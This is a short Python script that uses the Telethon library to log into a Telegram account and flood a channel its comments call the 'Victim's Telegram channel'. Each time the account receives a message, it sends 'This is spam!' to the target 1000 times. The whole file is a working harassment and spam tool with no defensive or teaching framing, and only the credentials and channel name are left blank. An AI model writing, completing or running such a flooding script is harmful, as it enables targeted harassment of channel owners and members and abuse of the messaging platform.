from telethon import TelegramClient, events

api_id =  # Your provided API ID
api_hash =  # Your provided API Hash

client = TelegramClient('flood_bot', api_id, api_hash)
client.start()

target_channel = ''  # Victim's Telegram channel

# Function to flood the channel with spam
@client.on(events.NewMessage)
async def flood(event):
    for _ in range(1000):
        await client.send_message(target_channel, 'This is spam!')

client.run_until_disconnected()  # Ensure this line is not broken
